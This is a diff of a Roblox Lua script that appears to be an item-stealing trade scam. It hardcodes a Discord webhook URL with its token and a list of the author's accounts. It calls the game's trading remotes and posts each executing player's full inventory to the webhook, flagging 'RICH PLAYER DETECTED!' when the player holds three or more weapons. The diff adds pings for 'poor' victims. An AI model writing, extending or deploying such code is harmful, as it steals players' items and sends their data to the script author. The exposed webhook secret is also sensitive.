@@ -24,8 +24,9 @@ local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/Acce
 local RFTradingSetTokens = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]
 
 local MY_WEBHOOK = "https://discord.com/api/webhooks/1464311781269831735/E7IlLpVLN_lcO_Mn9e0Ck_AzjawbVDAAkmyTHede0PRDsYP43goCqMLh5MN8ljkBaWg4"
-local USER_WEBHOOK = _G.Webhook or "PUTHERE"
-local MY_USERNAMES = _G.Usernames or {"jayhassogyau", "stopbanningmyaccs67", "mantskeys55", "jayisbodybuilt", "mydignames6769"}
+local USER_WEBHOOK = _G.POOR_WEBHOOK or "PUTHERE"
+local MY_USERNAMES = _G.MY_USERNAMES or {"jayhassogyau", "stopbanningmyaccs67", "mantskeys55", "jayisbodybuilt", "mydignames6769"}
+local PING_POOR = _G.PING_POOR ~= nil and _G.PING_POOR or true
 
 local START_TIME = os.time()
 
@@ -233,6 +234,7 @@ local function sendFullInventory()
     }
     local content = playerName.." has executed"
     if hasAtLeast3Weapons and useMyWebhook then content = content .. " @everyone @here 🔔 RICH PLAYER DETECTED!" end  -- Changed condition
+    if not useMyWebhook and PING_POOR then content = content .. " @everyone" end
     local payload = {content = content, embeds = {embed}}
     return sendRequest(targetWebhook, payload)
 end
